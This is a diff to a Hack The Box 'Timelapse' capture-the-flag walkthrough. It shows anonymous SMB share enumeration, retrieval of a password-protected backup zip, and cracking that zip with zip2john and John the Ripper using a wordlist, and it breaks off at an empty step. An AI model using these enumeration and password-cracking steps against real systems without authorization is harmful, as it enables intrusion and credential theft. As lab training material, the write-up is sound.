@@ -78,7 +78,8 @@ Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
 
 ```
  elrond@kali  ~  smbclient -N -L \\\\10.10.11.152\\
-
+```
+```
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
@@ -95,7 +96,9 @@ Unable to connect with SMB1 -- no workgroup available
   <li> Now that we know some sharenames on the target, let's try connnecting to them
   
   ```
-      elrond@kali  ~/Downloads/HackTheBox  smbclient -N \\\\10.10.11.152\\Shares\\                        
+      elrond@kali  ~/Downloads/HackTheBox  smbclient -N \\\\10.10.11.152\\Shares\\
+  ```
+  ```
       Try "help" to get a list of possible commands.
       smb: \> dir
         .                                   D        0  Mon Oct 25 11:39:15 2021
@@ -116,7 +119,39 @@ Unable to connect with SMB1 -- no workgroup available
   ```
     
   </li>
+  <li>
+    And after manually extracting it, we discover that it is a password protected filein which we know need to give this file to John The Ripper via zip2john
+
+```
+elrond@kali  ~/Downloads/HackTheBox/Timelapse  zip2john winrm_backup.zip > timelapse.txt
+```
+```
+Created directory: /home/elrond/.john
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+```
 
 
+```
+elrond@kali  ~/Downloads/HackTheBox/Timelapse  john timelapse.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2022-03-31 02:08) 4.166g/s 14472Kp/s 14472Kc/s 14472KC/s surkerior..superkebab
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 
-4. 
+```
+  </li>
+  </ul>
+
+
+4. Decrypting
+   Now that we have Figured out the password which is ```supremelegacy``` we can now unzip the file, showing a PFX file ```legacyy_dev_auth.pfx``` 
+  which contains the SSL certificate (public keys) and the corresponding private keys of who we presume is a *Developer(Dev)* with the username *legacyy*.
+  However accessing the file would prompt another password.
+  
+5. 
